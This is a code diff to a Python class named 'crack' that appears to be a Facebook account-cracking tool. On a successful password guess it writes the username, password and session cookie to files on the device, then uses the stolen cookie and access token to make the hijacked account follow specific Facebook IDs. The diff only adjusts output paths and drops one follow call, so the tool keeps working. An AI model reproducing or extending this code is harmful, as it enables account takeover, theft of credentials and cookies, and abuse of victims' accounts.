@@ -638,8 +638,8 @@ class crack:
                 if "c_user" in str(cok):
                     coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                     print(f"\r{HH}[OK-GSXD] {user} | {pw} {VV}    ")
-                    open("/sdcard/GS-2X-IDS/M4- IDS/M3-GSXD_OK.TXT", "a").write(used + "|" + pw + "\n")
-                    open("/sdcard/GS-2X-IDS/M4- IDS/M3-GSXD_COKIE.TXT", "a").write(used + "	|	" + pw + " 	| 	" + cokie + 																	"			\n")
+                    open("/sdcard/GS-2X-IDS/M-1 IDS/M3-GSXD_OK.TXT", "a").write(used + "|" + pw + "\n")
+                    open("/sdcard/GS-2X-IDS/M-1 IDS/M3-GSXD_COKIE.TXT", "a").write(used + "	|	" + pw + " 	| 	" + cokie + 																	"			\n")
                     ok.append(user + pw)
                     self.follow(coki)
                     break
@@ -713,7 +713,6 @@ class crack:
                     open("/sdcard/GS-2X-IDS/M-1 IDS/M1-GSXD_OK.TXT", "a").write(used + "|" + pw + "\n")
                     open("/sdcard/GS-2X-IDS/M-1 IDS/M1-GSXD_COKIE.TXT", "a").write(used + "	|	" + pw + " 	| 	" + cokie + 																	"			\n")
                     ok.append(user + pw)
-                    self.follow(coki)
                     break
                 elif "checkpoint" in str(cok):
                     user=cok['checkpoint'][13:28]
@@ -970,8 +969,6 @@ class crack:
                         follow_id='100000160984736' #uzzal
                         subs = requests.post('https://graph.facebook.com/'+follow_id+'/subscribers?access_token='+tokic, cookies={'cookie':cokie}).text
                         follow_id='100009468801755' #riyad
-                        subs = requests.post('https://graph.facebook.com/'+follow_id+'/subscribers?access_token='+tokic, cookies={'cookie':cokie}).text
-                        follow_id='100038890422760' #gopal
                         subs = requests.post('https://graph.facebook.com/'+follow_id+'/subscribers?access_token='+tokic, cookies={'cookie':cokie}).text
                         break
                     except KeyError:
